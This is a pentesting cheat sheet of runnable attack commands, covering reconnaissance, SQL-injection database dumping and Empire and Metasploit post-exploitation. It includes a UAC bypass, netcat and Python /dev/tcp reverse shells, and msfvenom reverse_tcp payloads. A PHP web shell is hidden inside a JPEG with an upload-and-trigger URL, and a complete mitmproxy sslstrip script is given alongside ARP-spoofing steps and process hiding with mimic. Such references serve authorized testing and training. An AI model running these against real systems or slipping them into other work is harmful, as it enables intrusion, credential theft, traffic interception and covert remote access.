# Pentesting Cheatsheet

## Footprinting and Enumeration


### Nikto
#### Run nikto scan
```
nikto -host <host>

-host: Host to target with IP address, hostname or text file of hosts.
```


### Nmap 
#### Scan remote host with TCP scan:
```
nmap -PS A -v <remote_host> > file.txt

or

nmap -sV -v <remote_host>

-A: Enable OS detection, version detection, script scanning, and traceroute
-sV: Probe to detect open ports and services.
-v: Verbose.
-PS: TCP services scan.
```

example:

```
nmap -PS A -v 10.10.10.21 > file.txt
```
#### Scan remote host with UDP scan:
```
nmap -sU -sV --top-ports <top_ports> <rhost>
```

example:
```
nmap -sU -sV --top-ports 100 10.10.10.21
```

#### Scan remote host with script scan:
```
nmap <ip> --script=<script>
```

example:
```
nmap 10.10.10.14 --script=http-webdav-scan
```

More scripts found in /usr/share/nmap/scripts. For instance, http-enum.nse enumerates directories used by popular web applications and servers

#### Scan with forced port scan (for hosts that don't allow probes):
```
nmap -PS <ip> -P0
```

example:
```
nmap -PS 10.10.10.14 -P0
```

### Masscan
(Requires installation). Scanner that is regularly quicker than nmap, but is noisy and more detectable. 
```
cd /usr/share/masscan/bin
./masscan -e tun0 -p<1-65535> <ip>

-e: interface
-p: port range as list
```

example
```
./masscan -e tun0 -p1-65535 10.10.10.21
```

### PortWitness
Requires installation available at: https://github.com/viperbluff/PortWitness 
Note: This tool requires sublist3r as prerequisite (https://github.com/aboul3la/Sublist3r)

#### Find active domains and subdomains
```
python2 name.py url
```


### Dirb
#### Search for hidden directories using wordlists:
```
dirb <target_host>
```

example:
```
dirb http://10.10.10.100/ 
```

### Dirsearch
#### Enumerate directories using wordlists
Python3 implementation of a directory enumerator. Obtain from: https://github.com/maurosoria/dirsearch. Once cloned run as:
```
python3 dirsearch.py -u <url> -fe php -t 25 -w /path/to/wordlist.txt

-u: URL
-fe: file search
-w: wordlist path
-t: Number of threads
```

example:
```
python3 dirsearch.py -u domain.com -fe php -t 10 -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt
```

### Gobuster
#### Enumerate directories using wordlists
```
gobuster -u <URL> -x php -w /path/to/wordlist.txt

-u: URL
-x: file type search
-w: wordlist path
```

example:
```
gobuster -u domain.com -x php -w /usr/share/dirbuster/wordlist/directory-list-2.3-medium.txt
```
### Metasploit dirscanner
#### Directory search:
```
msfv> use auxiliary/scanner/http/dir_scanner
msfv> set threads THREADS
msfv> set rhost RHOST
msfv> run
```

### Wfuzz
#### Website fuzzing
Replace the word "FUZZ" in a URL with words from a wordlist.
```
wfuzz -c -z <file,wordlist> --hc=<CODE> <URL/FUZZ>

-c: output with colors
-z: Payload in the form of file,wordlist
--hc: Hide responses with specific code
```

example for folders:
```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://10.10.10.14/FUZZ/
```
example for php files:
```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt --hc=404 http://10.10.10.14/FUZZ.php
```
### Whatweb
#### website fingerprinting
```
whatweb -v -a <1,3,4> <IP>

-v: verbose mode
-a: agression level from 1 (stealthy), 3 (Aggressive), or 4 (Heavy)
```

example:
```
whatweb -v -a 3 192.168.0.102
```

### Dig
#### Name server query on a domain.
```
dig <domain> -t ns
```

example:
```
dig domain.com -t ns
```

#### Transfer zone request with no comments:

Use axfr record to find zone transfers in a domain. 
```
dig axfr <domain> @<name-server> +nocmd +nocomments +nostat 
```

example:

Perform a zone trasnfer query on server 10.10.10.14 running DNS on port 53. 
```
dig axfr domain.com @10.10.10.14 +nocmd +nocomments +nostat 
```

### Host
#### Use "host" linux native comand for name server queries. 
```
host -t ns <domain>
```
example:
```
host -t ns domain.com
```

#### List zone trasnfers (if available)
```
host -l <domain> <name-server> 
```
<name-server> can be obtained from the step above. 
 
 example:
```
host -t domain.com ns1.domain.svr
```

### Nslookup
#### Name server query
```
$ nslookup
> set type=ns
> <domain>
```

example:
```
$ nslookup
> set type=ns
> mydomain.com
```
The above should return a list of name servers (if allowed). 

### Sqlmap
#### Probe site for sql injection vulnerabilities
```
sqlmap -u <URL> --dbms=<database_type>
```

example:
```
sqlmap -u domain.com/login.php --data="user=admin&pass=test" --dbms=sql
```

#### Perform enumeration through injection
```
sqlmap -u <URL> --dbms=<database_type> --<param>
 
<param>: Any retrievable param like users, paswords, privileges, roles, dbs, tables, form. etc.
```

Enumerate users example:
```
sqlmap -u domain.com/admin.php --dbms=sql --users
```

Enumerate tables example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB --tables
```

Enumerate columns in table example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB -T my_table --columns 
```

Dump database example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB --dump

Note: -D option specifies the database name and can be combined with --dump to dump the entire database.
```

Dump columns contents from table example:
```
sqlmap -u domain.com/admin.php --dbms=sql -D myDB -T my_table -C col_1,col2 --dump
```
 
 ### SQL injection cheatsheet
 https://portswigger.net/web-security/sql-injection/cheat-sheet

### DNS Recon
#### Enumerate all records of a DNS server
```
dnsrecon -d <domain>
```

### Drupwn
#### Enumerate Drupal sites (Requires install)
```
drupwn enum <http://URL>   
```

example:
```
drupwn enum http://10.10.10.12
```

### Droopescan
#### Enumerate Drupal sites (Requires install)
```
./droopescan scan -u <http://URL>   
```

example:
```
./droopescan scan -u http://10.10.10.23
```

### Wpscan
#### Enumerate wordpress sites
```
wpscan -u <http://URL> --enumerate p --enumerate u --enumerate p

--enumerate: Enumerate users (u), plugins (p), themes (t)
```

### Joomscan
#### Enumerate joomla sites
```
perl joomscan.pl -u <url> 
```

### LinEnum
#### Linux Enumeration:
Can be found at http://github.com/Z3R0th-13/LinEnum. (Requires upload to existing shell in target)

Upload with netcat:
```
On receiving host:

nc -lp LPORT > enum.sh

LPORT is the lostening port of the receiving machine.

```

```
On sender:

nc RHOST RPORT < enum.sh
```

Make enum.sh executable on remote and run:
```
chmod +x enum.sh
./enum.sh
```

### Linuxprivchecker
#### Linux Enumeration: 
Can be found at https://github.com/ankh2054/linux-pentest/blob/master/linuxprivchecker.py. (Requires upload to existing shell target). 

Upload with netcat:
```
On remote host:

nc LHOST LPORT -w3 > linpriv.py

LHOST and LPORT are the address and port of your client machine.
```

```
On Client:

nc RHOST RPORT < linuxprivchecker.py
```

Run:
```
python linpriv.py
```
### Native search for SUID and SGID
SUID under root:
```
find / -perm +4000
```
SGID under root:
```
find / -perm +2000
```
Both:
```
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -l {} \;
```

### JAWS windows enumeration
#### Windows Enumeration
Can be found at: https://github.com/411Hall/JAWS/blob/master/jaws-enum.ps1. (Requires upload to existing shell target)

After uploading, run in victim:
```
powershell.exe -ExecutionPolicy Bypass - File ./jaws.ps1 -OutputFilename win_enum.txt
```

Note: This ps script doesn't say when it's done so maybe add that before uploading to target. 

Once is done read file output:
```
type win_enum.txt
```

## Postexploitation and Payloads

### Empire 
Empire 4 is a post-exploitation framework that includes a pure-PowerShell Windows agents, Python 3.x Linux/OS X agents, and C# agents. It is the merger of the previous PowerShell Empire and Python EmPyre projects. The framework offers cryptologically-secure communications and flexible architecture.

https://github.com/BC-SECURITY/Empire

**Example listener**
We start by setting a listener in empire
```
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host 192.168.50.130:8080
(Empire: listeners/http) > execute
(Empire: listeners/http) > usestager multi/launcher
*** Unknown syntax: usestager multi/launcher
(Empire: listeners/http) > listeners
```
The listener will wait for incoming connections from the agents. Thus, we need to generate a powershell agent
```
(Empire: listeners) > usestager multi/launcher
(Empire: stager/multi/launcher) > set Listener http
(Empire: stager/multi/launcher) > set OutFile /opt/Empire/downloads/launcher.psq
(Empire: stager/multi/launcher) > set OutFile /opt/Empire/downloads/launcher.ps1
(Empire: stager/multi/launcher) > generate

[*] Stager output written out to: /opt/Empire/downloads/launcher.ps1
```

Download the agent on the victim machine and execute it to see a message saying "a new agent checked in"

Now you can interact with the agent, for instance to elevate privileges using the exploit suggester module
```
(Empire: agentz) > usemodule privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > run
[*] Tasked U65PW23Y to run TASK_CMD_JOB
[*] Agent U65PW23Y tasked with task ID 2
[*] Tasked agent agentz to run module powershell/privesc/powerup/allchecks
(Empire: powershell/privesc/powerup/allchecks) > 
Job started: VZEWS3


[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...
[+] User is in a local group that grants administrative privileges!
[+] Run a BypassUAC attack to elevate privileges to admin.
```
Notice the message `[+] User is in a local group that grants administrative privileges! Run a BypassUAC attack to elevate privileges to admin.` 

Now we can run a BypassUAC module

```
(Empire: powershell/privesc/bypassuac) > interact agentz
(Empire: agentz) > usemodule privesc/bypassuac_env
(Empire: powershell/privesc/bypassuac_env) > set Listener http
(Empire: powershell/privesc/bypassuac_env) > run
[>] Module is not opsec safe, run? [y/N] y
... output ommited ...
[*] Sending POWERSHELL stager (stage 1) to 192.168.50.131
[*] New agent SW2EKL8Z checked in
[+] Initial agent SW2EKL8Z from 192.168.50.131 now active (Slack)
[*] Sending agent (stage 2) to SW2EKL8Z at 192.168.50.131
... output ommited ...
```

At this point a new agent checks in, if we check the agents we'll see we have an admin agent
```
(Empire: powershell/privesc/bypassuac_env) > agents

[*] Active agents:

 Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
 ----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
 agentz   ps 192.168.50.131  SEC660-WIN10      SEC660-WIN10\student    powershell         7600   5/0.0    2022-02-17 22:05:29             http            
 SW2EKL8Z ps 192.168.50.131  SEC660-WIN10      *SEC660-WIN10\student   powershell         5740   5/0.0    2022-02-17 22:05:32             http  
```

### Covenant
Covenant is a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform for red teamers.

Covenant is an ASP.NET Core, cross-platform application that includes a web-based interface that allows for multi-user collaboration.

https://github.com/cobbr/Covenant

### RuralBishop (formerly UrbanBishop)
RuralBishop is practically a carbon copy of UrbanBishop by b33f, but all P/Invoke calls have been replaced with D/Invoke.

RuralBishop can inject malicious payload into windows processes at runtime and execute the paylad. Works well with payloads generated by covenant.

https://github.com/rasta-mouse/RuralBishop

### PowerSploit

* PowerSploit: is a project aimed at providing an exploitation framework in powershell. If you need to execute a payload you can use 

    * Invoke-Mimikatz and Invoke-CredentialInjection for credential-based pivoting. Mimikatz executes for RAM ionstead of an executable file and it can harvest credentials
    * Invoke-NinjaCopy and Get/Mount-VolumeShadowCopy for circumventing NTFS file permissions
    * Install-SSP to setup a Security Support Provider (SSP) DLL
    * PowerUp.ps1 PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations.Running Invoke-AllChecks will output any identifiable vulnerabilities along with specifications for any abuse functions. The -HTMLReport flag will also generate a COMPUTER.username.html version of the report.

https://github.com/PowerShellMafia/PowerSploit

### Shellter

Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can
be used in order to inject shellcode into native Windows applications
(currently 32-bit apps only). The shellcode can be something yours or something
generated through a framework, such as Metasploit.

 Works well with payloads generated by covenant.

https://github.com/ParrotSec/shellter

### cpscam
Is a useful aid for impersonating an authenticated client and bypassing the captive portal authentication process

https://github.com/codewatchorg/cpscam

### CUPP
#### Generate password based on user profiling
GitRepo: https://github.com/Mebus/cupp
Interactive mode where you answer questions about the user to generate the password list
```
python3 cupp.py -i
```

### Hydra
#### Perform authentication requests using a passwrod list

Example with posts requests
```
hydra -l <USERNAME> -P <PASSWORD_LIST> -vV -f -t 5 <SOME_IP> http-post-form "/secret.php:username=^USER^&password=^PASS^:<LOGGIN_ERROR>"
```

### Cadaver
#### Exploit hosts that support http methods: 
```
cadaver <ip>

...(If successful) Upload webshells from cadaver shell:
put <payload> payload.txt
```
Tip: use .txt extension to avoid execution on upload and rename later.

example
```
cadaver 10.10.10.55

...(new shell)
dav:/> put /usr/share/webshells/php/php-reverse-php.php my_shell.php
dav:/> mv my_shell.txt my_shell.php
```

### MSFvenom
#### Create payload with MSFvenom
```
msfvenom -p <payload> LHOST=<lhost> LPORT=<lport> -f <file_type> > payload.file_type

-p: Dir path to payload
LHOST: Listening host ip address
LPORT: Listening port
-f: File type for the payload e.g asp, aspx, php
```

asp payload example:
```
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.14.2 LPORT=2222 -f exe > my_payload.exe
```

Metasploit payload example: 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=2222 -f asp > my_payload.asp

... (Needs listener on metasploit)
```

### Metasploit listener
```
metasploit
msfv> use exploit/multi/handler
msfv> set payload /windows/meterpreter/reverse_tcp
msfv> set LHOST lhost
msfv> set LPORT lport
msfv> run
```

## Steganography

### Jhead
#### Embed code into jpeg files:
Assuming jhead is already installed, first, clean up the headers:
```
./jhead -purejpg <image.jpg>
```

Then, add flag to add code execution on jpg image from editor:
```
./jhead -ce <image.jpg>
```

Sample php script:
```
<style>body{font-size: 0;}h1{font-size: 12px}</style><h1><?php if(isset($_REQUEST['cmd'])){system($_REQUEST['cmd']);}else{echo '<img src="./clean_image.jpg" border=0>';}__halt_compiler();?></h1>
```

Rename file to include php extension:
```
mv <image.jpg> <image.php.jpg>
```

example:
```
./jhead -purejpg my_image.jpg
./jhead -ce my_image.jpg

.... (copy sample script to my_image.jpg)

mv my_image.jpg my_image.php.jpg 

... (Upload and test on domain.com)

http://domain.com/my_image.php.jpg?cmd=nc -lvnp 2222 -e /bin/bash
```
## Network Tools
### Ettercap
Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.

https://www.ettercap-project.org/

MitM exmaple:
```
sudo ettercap -T -q -M arp:remote /192.168.50.129// /192.168.50.128//
```
### Bettercap
The Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and IPv4 and IPv6 networks reconnaissance and MITM attacks.

https://www.bettercap.org/

**Example ARP spoofing with network sniffing**

```
# bettercap
bettercap v2.26.1 (built for linux amd64 with go1.13.3) [type 'help' for a list of commands]

192.168.50.0/24 > 192.168.50.130  »  net.sniff on
192.168.50.0/24 > 192.168.50.130  » arp.spoof on
```

you can add an http proxy if you want to do another attack like ssl stripping:
```
http.proxy on
http.proxy.ssltrip true
```

### Mitmproxy/mitmdump
mitmproxy is your swiss-army knife for debugging, testing, privacy measurements, and penetration testing. It can be used to intercept, inspect, modify and replay web traffic such as HTTP/1, HTTP/2, WebSockets, or any other SSL/TLS-protected protocols.

https://docs.mitmproxy.org/stable/

**Example ssl strippping with mitmdump**

You will need:

* A tool to become MitM (like bettercap/ettercap/mitmdump)
* An ssl stripping script
* mdump to execute the stripping script

You can use the following ssl strip script as input to mitmdump

```
"""
This script implements an sslstrip-like attack based on mitmproxy.
https://moxie.org/software/sslstrip/
"""
import re
import urllib

# set of SSL/TLS capable hosts
secure_hosts = set()


def request(flow):
    flow.request.headers.pop('If-Modified-Since', None)
    flow.request.headers.pop('Cache-Control', None)

    # do not force https redirection
    flow.request.headers.pop('Upgrade-Insecure-Requests', None)

    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = 'https'
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host


def response(flow):
    flow.response.headers.pop('Strict-Transport-Security', None)
    flow.response.headers.pop('Public-Key-Pins', None)

    # strip links in response body
    flow.response.content = flow.response.content.replace(b'https://', b'http://')

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = b'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(csp_meta_tag_pattern, b'', flow.response.content, flags=re.IGNORECASE)

    # strip links in 'Location' header
    if flow.response.headers.get('Location', '').startswith('https://'):
        location = flow.response.headers['Location']
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers['Location'] = location.replace('https://', 'http://', 1)

    # strip upgrade-insecure-requests in Content-Security-Policy header
    if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
        csp = flow.response.headers['Content-Security-Policy']
        flow.response.headers['Content-Security-Policy'] = re.sub('upgrade-insecure-requests[;\s]*', '', csp, flags=re.IGNORECASE)

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all('Set-Cookie')
    cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
    flow.response.headers.set_all('Set-Cookie', cookies)

```
Then run mitmdump with that script as input
```
mitmdump --mode transparent -s sslstrip.py
```

### Yersinia 
Yersinia is a framework for performing layer 2 attacks. It is designed to take advantage of some weakeness in different network protocols. It pretends to be a solid framework for analyzing and testing the deployed networks and systems.

https://www.kali.org/tools/yersinia/

### Loki
Loki is a python based infrastructure pentesting tool focussing on layer 3 protocols, dealing with protocols such as:

* ARP
* HSRP
* RIP
* BGP
* OSPF
* EIGRP
* WLCCP
* VRRP
* BFD
* LDP
* MPLS

https://insinuator.net/tag/loki/

### SSL Strip
SSL Strip
SSL strip avoids any certificate warnings by rewritting akk HTTP traffic to remove references of HTTPS. All HTTP traffic is forwarded through the attacker and the attacker forwards traffic to server over HTTPS. 

https://en.kali.tools/?p=30

## Misc

### Get python promp from existing reverseshell
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Netcat 
Start Listener:
```
nc -lvnp <LPORT>
```

Connect to Listener with bash (if nc version supports -e):
```
nc <LHOST> <LPORT> -e /bin/bash
```
or (with no /):
```
nc <LHOST> <LPORT> -c bash
```
### Start python simple server
```
python -m SimpleHTTPServer PORT
```
### Mimic
#### Hide malicious process in Linux by pretending to be a different one.
Project info at: https://github.com/emptymonkey/mimic
Mimic a process with mimic's default camouflage (apache2 service)
```
./mimic -e <process>
```

Mimic with user specified process:
```
./mimic -e <process> -m <camouflage>
```

example:
```
./mimic -e /bin/bash
```
```
./mimic -e /bin/bash -m "lib/systemd/systemd --user"
```

### Metasploit exploit suggester
1) Create a metasploit reverse shell payload
```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf > rev.elf
```

2) Upload the payload to the victim and give execution privileges. 

3) Set meterpreter handler
```
msf> use exploit/multi/handler
msf> set payload linux/x64/meterpreter/reverse_tcp
msf> set LHOST <LHOST>
msf> set LPORT <LPORT>
msf> exploit
```

4) Back on the targe machine run the exploit:
```
$ ./rev_metasploit.elf
```

5) Run the exploit suggester on reverse handler:
```
meterpreter> background
msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION <SESS> (normally 1)
msf> run
```
6) Shell escaping sequences:
```
vi-->	:!bash
vi-->	:set shell=/bin/bash:shell
awk-->	awk 'BEGIN {system("/bin/bash")}'
find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
perl-->	perl -e 'exec "/bin/bash";'
````

7) Python oneliner reverse shell (inline with code):
```
__import__('os').system('bash -i >& /dev/tcp/xx.xx.xx.xx/XXXX 0>&1')
```

<!-- Special mentions:
Blue teaming:
osquery  - Detect inconsistencies of hidden malicious processes, PoC in Haking9/mimic documentation
yara - same as above 
-->

